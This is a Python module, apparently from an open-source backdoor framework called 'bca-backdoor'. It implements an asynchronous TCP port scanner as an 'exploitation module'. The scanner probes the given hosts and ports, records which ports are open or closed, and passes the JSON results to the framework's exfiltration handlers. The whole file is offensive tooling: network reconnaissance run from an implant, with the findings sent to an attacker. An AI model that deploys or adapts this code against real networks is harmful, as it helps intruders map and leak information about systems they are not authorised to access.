#!/usr/bin/env python3
# https://github.com/EONRaider/bca-backdoor

__author__ = 'EONRaider @ keybase.io/eonraider'

import asyncio
import json
from collections import defaultdict
from typing import Collection

from src.modules.exploitation.base import ExploitationModule


class TCPScanner(ExploitationModule):
    def __init__(self, *,
                 targets: Collection[str],
                 ports: Collection[int],
                 timeout: float):
        """Perform asynchronous TCP-connect scans on collections of
        target hosts and ports and send the results to pre-configured
        exfiltration methods.

        Args:
            targets (Collection[str]): A collection of strings
                containing a sequence of IP addresses and/or domain
                names.
            ports (Collection[int]): A collection of integers containing
                a sequence of valid port numbers as defined by IETF RFC
                6335.
            timeout (float): Time to wait for a response from a target
                before closing a connection to it.
        """

        super().__init__()
        self.targets = targets
        self.ports = ports
        self.timeout = timeout
        self.results = defaultdict(dict)
        self._loop = asyncio.get_event_loop()

    async def _scan(self, host: str, port: int) -> None:
        """Perform a TCP handshake on a target socket."""
        try:
            '''A successful handshake completes the connection without 
            errors. Different results raise exceptions related to the 
            reason for a failed connection. The port number, its state 
            and the reason why the state was assigned are added to the 
            'results' dictionary.'''
            await asyncio.wait_for(
                fut=asyncio.open_connection(host, port, loop=self._loop),
                timeout=self.timeout)
            port_state, reason = 'open', 'SYN/ACK'
        except (ConnectionRefusedError, asyncio.TimeoutError, OSError) as e:
            reasons = {
                'ConnectionRefusedError': 'Connection refused',
                'TimeoutError': 'No response',
                'OSError': 'Network error'
            }
            port_state, reason = 'closed', reasons[e.__class__.__name__]
        '''The 'results' dictionary is formatted as JSON. Ex:
        {'192.168.0.10': {22: ('closed', 'Connection refused'),
                          80: ('open', 'SYN/ACK')}}'''
        self.results[host].update({port: (port_state, reason)})

    def execute(self):
        scan_tasks = [self._scan(target, port) for port in self.ports
                      for target in self.targets]
        self._loop.run_until_complete(asyncio.wait(scan_tasks))
        self.exfil_buffer.append(json.dumps(self.results))
        self._notify_all_exfiltrators()
